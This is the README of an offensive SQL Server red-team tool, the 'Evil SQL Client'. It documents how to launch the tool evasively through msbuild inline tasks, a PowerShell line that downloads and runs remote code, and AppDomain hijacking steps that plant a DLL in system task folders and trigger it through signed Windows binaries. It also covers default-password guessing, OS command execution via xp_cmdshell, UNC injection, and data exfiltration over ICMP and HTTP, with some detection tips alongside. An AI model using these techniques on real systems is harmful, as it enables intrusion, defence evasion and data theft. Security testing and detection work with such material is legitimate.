![evilsqlclient](https://github.com/NetSPI/ESC/blob/master/screenshots/esc-logo.png)<br>

--------------------------<br>
Evil SQL Client (ESC)<br>
Version: v1.0 <Br>
Author: Scott Sutherland (@_nullbind), NetSPI 2020<Br>
<br>
Evil SQL Client (ESC) is an interactive .NET SQL console client with enhanced SQL Server discovery, access, and data exfiltration features.  While ESC can be a handy SQL Client for daily tasks, it was originally designed for targeting Active Directory domain joined SQL Servers during penetration tests and red team engagements.   The intent of the project is to provide an .exe, but also sample files for execution through mediums like msbuild and PowerShell.<br>
 
Most of ESC's functionality is based on the [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL/wiki/), [DAFT](https://github.com/NetSPI/DAFT), [SQLC2](https://github.com/NetSPI/SQLC2), and [SQLInjectionWiki](https://sqlwiki.netspi.com/) projects which are also related to SQL Server.  At the moment ESC does not have full feature parity with the PowerUpSQL or DAFT, but the most useful bits are there.

Below is a summary of what is covered in this readme:
<br><br>
<strong>Execution Options</strong><br>
* <a href="#compileexe">Compile source and run via exe</a>
* <a href="#runexe">Download release and run via exe</a>
* <a href="#runmsbuild">Download and run through MSBuild</a>
* <a href="#runps">Download and run through PowerShell</a>
* <a href="#runappdomain">Download and run through AppDomain Hijacking</a>

<strong>Command Options</strong><br>
* <a href="#supportedcommands">Supported Commands (HELP)</a> <br>
* <a href="#cmddiscovery">Discovery Command Examples</a> <br>
* <a href="#cmdaccess">Access Check Command Examples</a> <br>
* <a href="#targetone">Query Single Target</a> <br>
* <a href="#targetmany">Query Multiple Targets</a> <br>
* <a href="#cmdescalate">Privilege Escalation Command Examples</a> <br>
* <a href="#cmdexfiltrate">Exfiltration Command Examples</a> <br>
* <a href="#pendingcommands">Pending Commands</a> <br>

<strong>Detections</strong>
* MSBuild Tests: [Resource1](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1127/T1127.md)
* MSBuild Detection: [Resource1](https://github.com/MHaggis/CBR-Queries/blob/master/msbuild.md) | [Resource2](https://bleepsec.com/2018/11/26/using-attack-atomic-red-team-part1.html)
* SQL Server Detection: [Resource1](https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/Audit%20Command%20Execution%20Template.sql)
* AppDomain Detection - Consider monitoring for tasks.dll being written to c:\Windows\SysWow64\Tasks\ and c:\Windows\System32\Tasks\, affected files being copied out of system and program file directories, or the "APPDOMAIN_MANAGER_TYPE" and "COMPLUS_Version" environmental variables being set. Disclaimer: I haven't tested the AppDomain detections on scale so I dont know how much white noise they will produce.

# Execution Options <a name="exec">
Below is a list of options for running the Evil SQl Client (ESC).

### Compile Source and Run Exe <a name="compileexe"></a>
1. Download the source from  [esc folder](https://github.com/NetSPI/ESC/tree/master/esc).
1. Open the esc.sln file in Visual Studio.
2. Select Build -> Build Solution.
3. Run esc.exe.

![buildesc](https://github.com/NetSPI/ESC/blob/master/screenshots/start-esc-compile-1.png) 
 
### Download Release and Run Exe <a name="runexe"></a>
1. Download compiled esc.exe from [releases](https://github.com/NetSPI/ESC/releases). 
2. Run esc.exe.

![runescexe](https://github.com/NetSPI/ESC/blob/master/screenshots/start-esc-compile-2.png)
  
### Download and Run through MSbuild.exe <a name="runmsbuild"></a>
 
Evil SQL Client console can be run through msbuild inline tasks using the [esc.csproj file](https://github.com/NetSPI/ESC/blob/master/esc.csproj) or [esc.xml file](https://github.com/NetSPI/ESC/blob/master/esc.xml).<br>  Using msbuild.exe to execute .net code through inline tasks is a technique that was researched and popularized by Casey Smith. 

<strong>esc.proj</strong><br>
esc.proj includes all of the original Evil SQL Client (ESC) C Sharp source code inline. The inline .NET source code technique used in this variation seems to do a better job of avoiding detection than embedding the exe and calling through reflection.

<strong>esc.xml</strong><br>
esc.xml works a little differently and has the entire esc.exe hardcoded as a string which is then loaded through reflection using a technique highlighted in the [GhostBuild](https://github.com/bohops/GhostBuild) project by @bohops.  I should note that Windows Defender is pretty good at identifying this exe wrapping technique out of the box.

Updating esc.xml:<br>
To update the esc.xml follow the instructions below:
1. Download and compile esc.exe.
2. Run [Out-Compressdll](https://github.com/PowerShellMafia/PowerSploit/blob/master/ScriptModification/Out-CompressedDll.ps1) (by @mattifestation) against esc.exe.<br>
`Out-CompressedDll -FilePath esc.exe | out-file output.txt`
3. Replace the compressedBin string in esc.xml with the "EncodedCompressedFile" string generated from Out-CompressDll.
4. Replace compressedBinSize with the size generated from Out-CompressDll.
5. Run the script.<br>
`C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe esc.xml`

<strong>Execution Examples</strong><br>
Below are a few execution examples. Msbuild can accept a filepath on the command line, but no filepath is required if only one .csproj file exists in the directory your executing msbuild.exe from.  

In the examples below, esc.csproj has been renamed to 1.csproj:
<br><br>
 ` C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe ` <br>
 ![runescexe](https://github.com/NetSPI/ESC/blob/master/screenshots/start-esc-msbuild-1.png) 
 <br><br>
 `C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe esc.csproj` <Br>
 `C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe esc.xml` <br>
![runescexe](https://github.com/NetSPI/ESC/blob/master/screenshots/start-esc-msbuild-2.png) 
	
### Download and Run Functions through PowerShell <a name="runps"></a>
Below are some quick instructions for running ESC functions through PowerShell.

1. Download esc.exe.
2. Open PowerShell and load esc.exe through reflection.<br>
`[System.Reflection.Assembly]::LoadFile("c:\temp\esc.exe")`
3. Alternatively, [esc-example.ps1](https://github.com/NetSPI/ESC/blob/master/esc-example.ps1) contains a portable example generated using Out-Compressdll.  It can be loaded using the PowerShell command below.<br>
`IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/NetSPI/ESC/master/esc-example.ps1")`
4. After the assmbly is loaded you can run the desired function.  Examples below.
<pre>
[evilsqlclient.Program+EvilCommands]::GetSQLServersBroadCast()
[evilsqlclient.Program+EvilCommands]::GetSQLServersSpn()
[evilsqlclient.Program+EvilCommands]::MasterDiscoveredList
[evilsqlclient.Program+EvilCommands]::InstanceAllG = "enabled"
[evilsqlclient.Program+EvilCommands]::CheckAccess()
[evilsqlclient.Program+EvilCommands]::MasterAccessList
[evilsqlclient.Program+EvilCommands]::CheckDefaultAppPw()
[evilsqlclient.Program+EvilCommands]::CheckLoginAsPw()
[evilsqlclient.Program+EvilCommands]::MasterAccessList
</pre>

### Download and Run through AppDomain Hijacking<a name="runappdomain"></a>
Application domains provide an isolation boundary for security, reliability, and versioning, and for unloading .NET assemblies. Application domains are typically created by runtime hosts, which are responsible for bootstrapping the common language runtime before an application is run.  A typical application loads several assemblies into an application domain before the code they contain can be executed.   The default AppDomainManager can be replaced by setting the APPDOMAIN_MANAGER_ASM and APPDOMAIN_MANAGER_TYPE environmental variables. This provides users with the means load and execute .NET code from custom assemblies prior to the execution of the intended application, but within their process and thread.  

Reference: https://docs.microsoft.com/en-us/dotnet/framework/app-domains/application-domains  

It is possible to leverage that functionality and default write access to the c:\windows\system32\tasks\ directory to execute arbitrary .NET code through c:\windows\system32\ and c:\windows\SysWow64\ assemblies that import mscoree.dll. This technique was originally shared during Casey Smith's DerbyCon presentation [".Net Manifesto - Win Friends and Influence the Loader"](https://www.youtube.com/watch?v=BIJ2L_rM9Gc).

Below are instructions for executing ESC using this method.

1. Compile [esc-appdomain-hijack.cs](https://github.com/NetSPI/ESC/blob/master/esc-appdomain-hijack.cs) to tasks.dll. 
<pre>
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.Reflection.dll /r:System.IO.Compression.dll /r:System.Runtime.InteropServices.dll /r:System.EnterpriseServices.dll /target:library /out:tasks.dll esc-appdomain-hijack.cs			
</pre>

2. Update environment variables. Note: process, user, or system could be targeted.
<pre>
set APPDOMAIN_MANAGER_ASM=tasks, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
set APPDOMAIN_MANAGER_TYPE=Esc
set COMPLUS_Version=v4.0.30319
</pre>

3. Copy tasks.dll to target directories.
<pre>
copy tasks.dll C:\Windows\System32\Tasks\tasks.dll 
copy tasks.dll C:\Windows\SysWow64\Tasks\tasks.dll
</pre>

4. Identify .exe in c:\windows\system32\ that load mscoreee.dll.  This can be done quickly using the Get-PE function from Matt Graeber's [PowerShell Arsenal Project](https://github.com/mattifestation/PowerShellArsenal).
<pre>
gci c:\windows\system32\*.exe | get-pe | where-object {$_.Imports.ModuleName -Contains "mscoree.dll"} | Select ModuleName -ExpandProperty modulename
</pre>

5. Choose one of the affected commands and run it.
<pre>
Examples:
C:\windows\system32\acu.exe
C:\windows\system32\aitstatic.exe
C:\windows\system32\ClusterUpdateUI.exe
C:\windows\system32\dsac.exe
C:\windows\system32\FileHistory.exe
C:\windows\system32\LbfoAdmin.exe
C:\windows\system32\Microsoft.Uev.SyncController.exe
C:\windows\system32\mtedit.exe
C:\windows\system32\PresentationHost.exe
C:\windows\system32\RAMgmtUI.exe
C:\windows\system32\ScriptRunner.exe
C:\windows\system32\ServerManager.exe
C:\windows\system32\ShieldingDataFileWizard.exe
C:\windows\system32\stordiag.exe
C:\windows\system32\SynapticsUtility.exe
C:\windows\system32\TemplateDiskWizard.exe
C:\windows\system32\TsWpfWrp.exe
C:\windows\system32\UevAgentPolicyGenerator.exe
C:\windows\system32\UevAppMonitor.exe
C:\windows\system32\UevTemplateBaselineGenerator.exe
C:\windows\system32\UevTemplateConfigItemGenerator.exe
C:\windows\system32\Vmw.exe
</pre>

![runappdomain](https://github.com/NetSPI/ESC/blob/master/screenshots/esc-execute-via-appdomain-hijack3.png) 

This can also be done by copying the affected EXE and the tasks.dll to a directory that's writable by the user.  To detect those scenarios, consider monitoring for files being copied from system directories. However, note that attackers may be able to identify other affected EXEs on the system using the same discovery technique listed above.

![runappdomain](https://github.com/NetSPI/ESC/blob/master/screenshots/esc-execute-via-appdomain-hijack4.png) 

Using the steps below ESC can also be executed using cscript.exe once the tasks.dll has been written to disk.  Once again, based on Casey Smith's templates.

1. Create the file trigger.js with the content below.
<pre>
new ActiveXObject('WScript.Shell').Environment('Process')('COMPLUS_Version') = 'v4.0.30319';new ActiveXObject('WScript.Shell').Environment('Process')('TMP') = 'c:\\Windows\\System32\\Tasks';
new ActiveXObject('WScript.Shell').Environment('Process')('APPDOMAIN_MANAGER_ASM') = 'tasks, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null';
new ActiveXObject('WScript.Shell').Environment('Process')('APPDOMAIN_MANAGER_TYPE') = 'Esc';
var o = new ActiveXObject("System.Object"); 
</pre>

2. Execute it using cscript.exe.
<pre>
cscript trigger.js
</pre>

![runappdomain2](https://github.com/NetSPI/ESC/blob/master/screenshots/esc-execute-via-appdomain-hijack2.png) 

Note: Detections could include monitoring for tasks.dll being written to C:\Windows\System32\Tasks\tasks.dll and C:\Windows\SysWow64\Tasks\tasks.dll. Also, potentially the execution of the commands above without/with parameters.

Using the steps below ESC can also be executed through AppDomain hijacking using a configuration file.  Create a configuration file in the same folder as the target binary. Name it after the target assembly, but append .config to the file name. Example: scriptrunner.exe.config.  
Below is sample XML for the config file.

<pre>
<configuration>
<runtime>
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<probing privatePath="C:\Windows\Tasks"/> </assemblyBinding>
<appDomainManagerAssembly value="Tasks, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="Esc" />
</runtime>
</configuration>
</pre>


 # Supported Commands <a name="supportedcommands"></a>

 ### COMMAND LIST
 <pre>
    SHOW:
     show settings 			Show connection and exfil settings.
     show discovered 			Show discovered instances. 
     show access  			Show accessible instances, versions, and other information.
     show help 				Show this help page.
 
    CONFIGURE INSTANCE:
     set targetall			Target all accessible SQL Server instances. List with 'show access' command.
     set instance instancename		Target a single instance.  Instance formats supported include: 
 				    	server1
 				    	server1\instance1
 				    	server1,1433
     set connstring stringhere 		Set a custom connection string. Examples below.
				   	 Server=Server\Instance;Database=Master;Integrated Security=SSPI;Connection Timeout=1
				    	Server=Server\Instance;Database=Master;Integrated Security=SSPI;Connection Timeout=1;uid=Domain\Account;pwd=Password;
				    	Server=Server\Instance;Database=Master;Connection Timeout=1;User ID=Username;Password=Password
 
    CONFIGURE CREDENTIALS:
     set username username 		User for authenticatiing to SQL Server instances.
 				   	Defaults to current Windows user if no username or password is provided, but access SQL Login credentials.
     set password password		Password for the provided username.  
 				    	Defaults to current Windows user if no user or password is provided.
 
    QUERY COMMANDS:
     set timeout 1			Set query timeout. Useful over slow connections.
     query				Arbitrary TSQL query can be executed once a valid connection string is configured.
				    	To run against all accessible instances type 'set targetall enabled'.
				    	Type the query, then go, and press enter. Multi-line queries are supported.
				    	Note: You don't have to type the word 'query'.
				    	Example:
				    	SELECT @@VERSION
				    	GO
 
    DISCOVERY COMMANDS:
     discover broadcast			Discover SQL Server instances via a broadcast request.
     discover domainspn			Discover SQL Server instances via LDAP query to the default DC for MSSQL SPNs.
     discover file filepath		Discover SQL Server instance listed in a file.  One per line.
				    	Format examples: 
				    	hostname 
				    	hostname\instance
				    	hostname,port
     show discovered			Display the list of discovered SQL Server instances.
     export discovered outpath		Export the list of discovered SQL Server instances to a file. 
				   	 Example: export discovered c:\windows\temp\sqlinstances.txt
     clear discovered			Clear list of discovered SQL Server instances.

    INITAL ACCESS COMMANDS:
     check access			Attempts to log into all discovered SQL Server instances.  
 				    	Uses current Windows/Domain user by default. 
				    	Note: Will use alternative credentials if provided. (set username / set password)
     show access			List SQL Server instances that can be logged into.
     export access outpath		Export list of SQL Server instances that can be logged into to a file.
     clear access			Clear the in memory list of SQL Server instances that can be logged into.			
     check defaultlogins		Attempts to identify SQL Server instances that match known application and attempts the associate usernames and passwords.


    POST EXPLOITATION COMMANDS:
     list serverinfo			List server information for accessoble target SQL Server instances.
     list databases			List databases for accessoble target SQL Server instances.
     list tables			List tables information for accessoble target SQL Server instances.
  				    	Limits results to databases the login user has access to.
     list links				List links information for accessoble target SQL Server instances.
     list logins			List logins information for accessoble target SQL Server instances.
     list rolemembers			List rolemember information for accessoble target SQL Server instances.
     list privs				Check accessible target SQL Server instances for logins that use their login as a password.  
     check loginaspw     		Check accessible target SQL Server instances for logins that use their login as a password.                         
     check uncinject IP			Connect to taret SQL Server instance and perform UNC injection back to provide IP.	     
     run OSCMD command			Run os command through xp_cmdshell on the accessible target SQL Server instances. 
 				    	*Requires sysadmin privileges.
 
    CONFIGURE DATA EXFILTRATION: 
     set file enabled
     set filepath c:\temp\file.csv
     set icmp tenabled
     set icmpip 127.0.0.1
     set http enabled
     set httpurl http://127.0.0.1
     set encrypt enabled
     set enckey MyKey!
     set encsalt MySalt!

    MISC COMMANDS:
     help
     clear
     exit
 </pre>
 
 ### Common Command Sequences <a name="recommendcommands"></a>
Below are some common command examples to get you started.

<strong>Discovering SQL Server Instances</strong><br> <a name="cmddiscovery"></a>
Below are a few common methods to identify SQL Server on the network and domain without port scanning.
 
`discover domainspn`
![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/Discovery-DomainSPN.png)<br>

`discover broadcast`
![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/Discovery-Broadcast.png)<br>

`show discovered`
![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/Discovery-Show.png)<br>

<strong>Checking Access to Discovered Instances</strong><br> <a name="cmdaccess"></a>
After discovery, `check access` can be used to determine if the current or provided credentials can login into the discovered SQL Server instances.
 
` set targetall enabled` <br>
` show settings`
![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/Access-TargetAll.png)<br>
 
`check access`
![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/Access-CheckAccess.png)<br>
 
`show access`
![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/Access-ShowAccess.png)<br>
 
<strong>Query Single Target</strong> <a name="targetone"> <br>
Below are commands that can be used to target and query a single SQL Server instance. <br>

First configure ESC to target a single instance.  This will automatically disable the "targetall" setting.<br><br>
`Set target MSSQLSRV04\SQLSERVER2014` <br>
`Set username backdoor_account`<br>
`Set password backdoor_account`<br>
`Show settings`<br>
![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/Target-Instance1.png)<br>

Next simply execute your query and end your TSQL with the keyword "go". <br><br> 
`select @@version`<br>
`go`<br>
![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/Target-Instance3.png)<br>

You can also run "list" and other post exploitation commands against the target instance. <br><br> 
![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/Target-Instance2.png)<br>

<strong>Query Multiple Targets</strong> <a name="targetmany"> <br>
Below are commands that can be used to target and query all accessible SQL Server instances.  <br>
1. Import a list of target instances with the `discover file`, `discover domainspn`, or `discover broadcast` commands.<br>
2. Identify which instances you can log into. <br>
`check access`<br>
3. Enable multi instance targeting using the command below.  Once enabled all commands and queries will be run against all accessible SQL Server instances.<br><br>
`set targetall enabled`<br>
`show settings`<br>
4. Run query as normal.<br>
`select @@version`<br>
`go`<br>

<strong>Testing for Common Password Issues</strong><br> <a name="cmdescalate"></a>
Below are some checks for common password issues that can be used to gain initial entry and escalate privileges in some environments.
If "targetall" is enabled the commands below with target all discovered or accessible instances.  However, if a single instance is provided, then "targetall" will automatically be disabled to ensure only the one instance is targeted.

`check defaultpw` <br>
`check defaultpw` is run against discovered instances and does not require valid credentials. <br>
[Related Reading](https://blog.netspi.com/attacking-application-specific-sql-server-instances/) <br>
![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/Access-CheckDefaultPw.png)<br>
 
`check loginaspw` <br>
`check loginaspw` can be used once authenticated to enumerated all logins and test if they are using the login as the password. <br>
[Related Reading](https://blog.netspi.com/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/) <br>
![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/LoginAsPw1.png)<br>
![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/LoginAsPw2.png)<br>
 
<strong>Running OS Commands</strong><br>
Below is a ESC command for running OS commands on target instances.  It requires sysadmin privileges.<br>

`run oscmd whoami`<br>
![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/RunOsCmd1.png)<br>
 
<strong>Saving List of Accessible Servers</strong><br>
The command below can be used to export a list of servers that you can log into.<br>
`export access c:\temp\access.csv`<br>
![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/AccessExport1.png)<br>
![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/AccessExport2.png)<br>
 
<strong>Data Exfiltration Example: Local File</strong><br> <a name="cmdexfiltrate"></a>
Below is an example of how to exfiltrate data to a local file.
 
`set file enabled`<br>
`set filepath c:\temp\output.csv`
![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/FileExfil1.png)<br>
 
`select @@version`
![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/FileExfil2.png)<br>
![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/FileExfil3.png)<br>
 
<strong>Data Exfiltration Example: ICMP</strong><br>
Below is an example of how to exfiltrate data over ICMP with ESC.
 
`set icmp enabled` <br>
`set icmpip 192.168.1.1`
![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/IcmpExfil1.png)<br>
 
`select @@version`
![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/IcmpExfil12.png)<br> 
![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/IcmpExfil3.png)<br>

 
# Pending Commands <a name="pendingcommands"></a>
* Add logging w/ timestamps
* Add discover local 
* Add discover udpscan
* Add column find
* Add domain account enumeration
* Add link crawl + linkquery + linkoscmd
* Add escalate dbowner
* Add escalate imperonsate
* Threading
* Finish data encryption
* Create python/powershell script to decrypt encrypted exfiltrated data
* Rewrite query function to be more flexible

# Pending fixes
* Crashes when you just type go
* Crashes when you type ctrl+c

# Thank You
Below is a list of people who tested out esc and/or provided .net development guidance.  Thanks for all the help!
- Alexander Leary (@0xbadjuju) 
- Ivan Da Silva   (@humble_desser)
- Josh Weber      
- Kevin Robertson (@kevin_robertson) 
